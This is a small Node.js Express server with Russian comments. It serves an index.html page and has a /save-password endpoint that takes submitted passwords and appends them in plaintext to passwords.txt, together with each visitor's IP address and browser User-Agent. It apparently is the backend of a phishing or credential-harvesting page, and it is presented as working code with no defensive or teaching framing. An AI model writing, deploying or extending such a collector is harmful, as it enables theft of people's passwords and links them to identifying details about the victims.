const fs = require('fs')
const express = require('express')
const bodyParser = require('body-parser');
const app = express()

let port = 9999

app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html')
})

app.post('/save-password', (req, res) => {
    const password = req.body.password;         // Парсинг пароля
    const userIP = req.ip;                      // Получаем IP-адрес пользователя
    const userAgent = req.get('User-Agent');    // Получаем информацию о браузере пользователя
    fs.appendFileSync('passwords.txt', "IP: " + userIP + "; " + userAgent + ": " + password + "\n");
    res.json({ message: 'Password saved successfully!' });
});

app.listen(port, () => {
    console.log('Сервер запущен на порту ' + port)
})